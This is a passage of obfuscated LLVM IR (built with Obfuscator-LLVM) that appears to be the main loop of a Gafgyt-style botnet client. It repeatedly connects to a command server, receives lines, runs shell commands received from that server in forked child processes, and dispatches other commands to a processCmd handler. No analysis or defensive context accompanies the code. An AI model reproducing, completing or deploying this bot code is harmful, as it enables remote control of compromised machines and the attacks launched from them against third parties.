  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %32 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge83

.backedge83.loopexit:                             ; preds = %.backedge
  br label %.backedge83.backedge

.backedge83:                                      ; preds = %.backedge83.backedge, %26
  %33 = call i32 @initConnection()
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %37, label %35

; <label>:35:                                     ; preds = %.backedge83
  %36 = call i32 @sleep(i32 5) #3
  br label %.backedge83.backedge

; <label>:37:                                     ; preds = %.backedge83
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0))
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 @recvLine(i32 %40, i8* nonnull %30, i32 4096)
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.backedge83.backedge, label %.preheader81.preheader

.backedge83.backedge:                             ; preds = %37, %35, %.backedge83.loopexit
  br label %.backedge83

.preheader81.preheader:                           ; preds = %37
  br label %.preheader81

.preheader81:                                     ; preds = %.preheader81.preheader, %.backedge
  %43 = phi i32 [ %93, %.backedge ], [ %41, %.preheader81.preheader ]
  %44 = load i64, i64* @numpids, align 8
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge100, label %.lr.ph99.preheader

.lr.ph99.preheader:                               ; preds = %.preheader81
  br label %.lr.ph99

.lr.ph99:                                         ; preds = %.lr.ph99.preheader, %.lr.ph99._crit_edge
  %indvars.iv = phi i64 [ %51, %.lr.ph99._crit_edge ], [ 0, %.lr.ph99.preheader ]
  %46 = load i32*, i32** @pids, align 8
  %47 = getelementptr inbounds i32, i32* %46, i64 %indvars.iv
  %48 = load i32, i32* %47, align 4
  %49 = call i32 @waitpid(i32 %48, i32* null, i32 1) #3
  %50 = icmp sgt i32 %49, 0
  %51 = add nuw i64 %indvars.iv, 1
  br i1 %50, label %.preheader, label %.lr.ph99._crit_edge

.preheader:                                       ; preds = %.lr.ph99
  %52 = load i64, i64* @numpids, align 8
  %53 = icmp ult i64 %51, %52
  %54 = load i32*, i32** @pids, align 8
  %55 = trunc i64 %indvars.iv to i32
  br i1 %53, label %.lr.ph90.preheader, label %._crit_edge91

.lr.ph90.preheader:                               ; preds = %.preheader
  %56 = trunc i64 %51 to i32
  br label %.lr.ph90

.lr.ph90:                                         ; preds = %.lr.ph90.preheader, %.lr.ph90
  %57 = phi i32* [ %66, %.lr.ph90 ], [ %54, %.lr.ph90.preheader ]
  %58 = phi i64 [ %63, %.lr.ph90 ], [ %51, %.lr.ph90.preheader ]
  %.07089 = phi i32 [ %.070, %.lr.ph90 ], [ %56, %.lr.ph90.preheader ]
  %.070.in88 = phi i32 [ %.07089, %.lr.ph90 ], [ %55, %.lr.ph90.preheader ]
  %59 = getelementptr inbounds i32, i32* %57, i64 %58
  %60 = load i32, i32* %59, align 4
  %61 = zext i32 %.070.in88 to i64
  %62 = getelementptr inbounds i32, i32* %57, i64 %61
  store i32 %60, i32* %62, align 4
  %.070 = add i32 %.07089, 1
  %63 = zext i32 %.070 to i64
  %64 = load i64, i64* @numpids, align 8
  %65 = icmp ult i64 %63, %64
  %66 = load i32*, i32** @pids, align 8
  br i1 %65, label %.lr.ph90, label %._crit_edge91.loopexit

._crit_edge91.loopexit:                           ; preds = %.lr.ph90
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %._crit_edge91.loopexit, %.preheader
  %.070.in.lcssa = phi i32 [ %55, %.preheader ], [ %.07089, %._crit_edge91.loopexit ]
  %.lcssa = phi i32* [ %54, %.preheader ], [ %66, %._crit_edge91.loopexit ]
  %67 = zext i32 %.070.in.lcssa to i64
  %68 = getelementptr inbounds i32, i32* %.lcssa, i64 %67
  store i32 0, i32* %68, align 4
  %69 = load i64, i64* @numpids, align 8
  %70 = add i64 %69, -1
  store i64 %70, i64* @numpids, align 8
  %71 = shl i64 %69, 2
  %72 = call noalias i8* @malloc(i64 %71) #3
  %73 = bitcast i8* %72 to i32*
  %74 = icmp eq i64 %70, 0
  %75 = load i32*, i32** @pids, align 8
  br i1 %74, label %._crit_edge96, label %.lr.ph95.preheader

.lr.ph95.preheader:                               ; preds = %._crit_edge91
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95.preheader, %.lr.ph95
  %76 = phi i64 [ %81, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %.17193 = phi i32 [ %80, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds i32, i32* %73, i64 %76
  store i32 %78, i32* %79, align 4
  %80 = add i32 %.17193, 1
  %81 = zext i32 %80 to i64
  %82 = icmp ult i64 %81, %70
  br i1 %82, label %.lr.ph95, label %._crit_edge96.loopexit

._crit_edge96.loopexit:                           ; preds = %.lr.ph95
  br label %._crit_edge96

._crit_edge96:                                    ; preds = %._crit_edge96.loopexit, %._crit_edge91
  %83 = bitcast i32* %75 to i8*
  call void @free(i8* %83) #3
  store i8* %72, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph99._crit_edge

.lr.ph99._crit_edge:                              ; preds = %.lr.ph99, %._crit_edge96
  %sext = shl i64 %51, 32
  %84 = ashr exact i64 %sext, 32
  %85 = load i64, i64* @numpids, align 8
  %86 = icmp ult i64 %84, %85
  br i1 %86, label %.lr.ph99, label %._crit_edge100.loopexit

._crit_edge100.loopexit:                          ; preds = %.lr.ph99._crit_edge
  br label %._crit_edge100

._crit_edge100:                                   ; preds = %._crit_edge100.loopexit, %.preheader81
  %87 = sext i32 %43 to i64
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %87
  store i8 0, i8* %88, align 1
  call void @trim(i8* nonnull %30)
  %strncmp = call i32 @strncmp(i8* nonnull %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %89, label %95

; <label>:89:                                     ; preds = %._crit_edge100
  %90 = load i32, i32* @mainCommSock, align 4
  %91 = call i32 (i32, i8*, ...) @sockprintf(i32 %90, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph112
  br label %.backedge

.backedge.loopexit130:                            ; preds = %.preheader113
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit130, %.backedge.loopexit, %._crit_edge109.thread, %89, %._crit_edge109, %97, %129
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 @recvLine(i32 %92, i8* nonnull %30, i32 4096)
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %.backedge83.loopexit, label %.preheader81

; <label>:95:                                     ; preds = %._crit_edge100
  %strncmp73 = call i32 @strncmp(i8* nonnull %30, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i64 0, i64 0), i64 5)
  %cmp74 = icmp eq i32 %strncmp73, 0
  br i1 %cmp74, label %96, label %97

; <label>:96:                                     ; preds = %95
  call void @exit(i32 0) #17
  unreachable

; <label>:97:                                     ; preds = %95
  %98 = load i8, i8* %30, align 16
  %99 = icmp eq i8 %98, 33
  br i1 %99, label %.preheader113.preheader, label %.backedge

.preheader113.preheader:                          ; preds = %97
  br label %.preheader113

.preheader113:                                    ; preds = %.preheader113.preheader, %101
  %.068 = phi i8* [ %102, %101 ], [ %31, %.preheader113.preheader ]
  %100 = load i8, i8* %.068, align 1
  switch i8 %100, label %101 [
    i8 0, label %.backedge.loopexit130
    i8 32, label %103
  ]

; <label>:101:                                    ; preds = %.preheader113
  %102 = getelementptr inbounds i8, i8* %.068, i64 1
  br label %.preheader113

; <label>:103:                                    ; preds = %.preheader113
  store i8 0, i8* %.068, align 1
  %104 = call i64 @strlen(i8* %31) #15
  %105 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %104
  %106 = getelementptr inbounds i8, i8* %105, i64 2
  br label %107

; <label>:107:                                    ; preds = %112, %103
  %108 = call i64 @strlen(i8* %106) #15
  %109 = add i64 %108, -1
  %110 = getelementptr inbounds i8, i8* %106, i64 %109
  %111 = load i8, i8* %110, align 1
  switch i8 %111, label %.preheader79.preheader [
    i8 13, label %112
    i8 10, label %112
  ]

.preheader79.preheader:                           ; preds = %107
  br label %.preheader79

; <label>:112:                                    ; preds = %107, %107
  store i8 0, i8* %110, align 1
  br label %107

.preheader79:                                     ; preds = %.preheader79.preheader, %114
  %.069 = phi i8* [ %115, %114 ], [ %106, %.preheader79.preheader ]
  %113 = load i8, i8* %.069, align 1
  switch i8 %113, label %114 [
    i8 32, label %116
    i8 0, label %116
  ]

; <label>:114:                                    ; preds = %.preheader79
  %115 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader79

; <label>:116:                                    ; preds = %.preheader79, %.preheader79
  store i8 0, i8* %.069, align 1
  %117 = getelementptr inbounds i8, i8* %.069, i64 1
  %118 = load i8, i8* %106, align 1
  %119 = icmp eq i8 %118, 0
  br i1 %119, label %._crit_edge104, label %.lr.ph103.preheader

.lr.ph103.preheader:                              ; preds = %116
  br label %.lr.ph103

.lr.ph103:                                        ; preds = %.lr.ph103.preheader, %.lr.ph103
  %120 = phi i8 [ %125, %.lr.ph103 ], [ %118, %.lr.ph103.preheader ]
  %.066101 = phi i8* [ %124, %.lr.ph103 ], [ %106, %.lr.ph103.preheader ]
  %121 = zext i8 %120 to i32
  %122 = call i32 @toupper(i32 %121) #15
  %123 = trunc i32 %122 to i8
  store i8 %123, i8* %.066101, align 1
  %124 = getelementptr inbounds i8, i8* %.066101, i64 1
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %._crit_edge104.loopexit, label %.lr.ph103

._crit_edge104.loopexit:                          ; preds = %.lr.ph103
  br label %._crit_edge104

._crit_edge104:                                   ; preds = %._crit_edge104.loopexit, %116
  %127 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i64 0, i64 0)) #15
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %142

; <label>:129:                                    ; preds = %._crit_edge104
  %130 = call i32 @listFork()
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %.backedge

; <label>:132:                                    ; preds = %129
  %133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %133, i8 0, i64 1024, i32 16, i1 false)
  %134 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %133, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i64 0, i64 0), i8* %117)
  %135 = call i32 @fdpopen(i8* nonnull %133, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i64 0, i64 0))
  %136 = call i8* @fdgets(i8* nonnull %133, i32 1024, i32 %135)
  %137 = icmp eq i8* %136, null
  br i1 %137, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %132
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %133)
  call void @llvm.memset.p0i8.i64(i8* nonnull %133, i8 0, i64 1024, i32 16, i1 false)
  %138 = call i32 @sleep(i32 1) #3
  %139 = call i8* @fdgets(i8* nonnull %133, i32 1024, i32 %135)
  %140 = icmp eq i8* %139, null
  br i1 %140, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %132
  %141 = call i32 @fdpclose(i32 %135)
  call void @exit(i32 0) #17
  unreachable

; <label>:142:                                    ; preds = %._crit_edge104
  %143 = call i8* @strtok(i8* %117, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #3
  store i8* %106, i8** %32, align 16
  %144 = icmp eq i8* %143, null
  br i1 %144, label %._crit_edge109.thread, label %.lr.ph108.preheader

.lr.ph108.preheader:                              ; preds = %142
  br label %.lr.ph108

._crit_edge109.thread:                            ; preds = %142
  call void @processCmd(i32 1, i8** nonnull %32)
  br label %.backedge

.lr.ph108:                                        ; preds = %.lr.ph108.preheader, %157
  %.064106 = phi i8* [ %158, %157 ], [ %143, %.lr.ph108.preheader ]
  %.065105 = phi i32 [ %.1, %157 ], [ 1, %.lr.ph108.preheader ]
  %145 = load i8, i8* %.064106, align 1
  %146 = icmp eq i8 %145, 10
  br i1 %146, label %157, label %147

; <label>:147:                                    ; preds = %.lr.ph108
  %148 = call i64 @strlen(i8* nonnull %.064106) #15
  %149 = add i64 %148, 1
  %150 = call noalias i8* @malloc(i64 %149) #3
  %151 = sext i32 %.065105 to i64
  %152 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %151
  store i8* %150, i8** %152, align 8
  %153 = call i64 @strlen(i8* nonnull %.064106) #15
  %154 = add i64 %153, 1
  call void @llvm.memset.p0i8.i64(i8* %150, i8 0, i64 %154, i32 1, i1 false)
  %155 = call i8* @strcpy(i8* %150, i8* nonnull %.064106) #3
  %156 = add nsw i32 %.065105, 1
  br label %157

; <label>:157:                                    ; preds = %.lr.ph108, %147
  %.1 = phi i32 [ %156, %147 ], [ %.065105, %.lr.ph108 ]
  %158 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i64 0, i64 0)) #3
  %159 = icmp eq i8* %158, null
  br i1 %159, label %._crit_edge109, label %.lr.ph108

._crit_edge109:                                   ; preds = %157
  call void @processCmd(i32 %.1, i8** nonnull %32)
  %160 = icmp sgt i32 %.1, 1
  br i1 %160, label %.lr.ph112.preheader, label %.backedge

.lr.ph112.preheader:                              ; preds = %._crit_edge109
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph112

.lr.ph112:                                        ; preds = %.lr.ph112.preheader, %.lr.ph112
  %indvars.iv120 = phi i64 [ %indvars.iv.next121, %.lr.ph112 ], [ 1, %.lr.ph112.preheader ]
  %161 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv120
  %162 = load i8*, i8** %161, align 8
  call void @free(i8* %162) #3
  %indvars.iv.next121 = add nuw nsw i64 %indvars.iv120, 1
  %exitcond = icmp eq i64 %indvars.iv.next121, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph112
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146616014}
!14 = !{i32 -2146614574}
!15 = !{i32 -2146613751}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
!19 = !{i32 -2146612931}
!20 = !{i32 -2146611527}
!21 = !{i32 -2146610665}
!22 = !{i32 -2146609944}
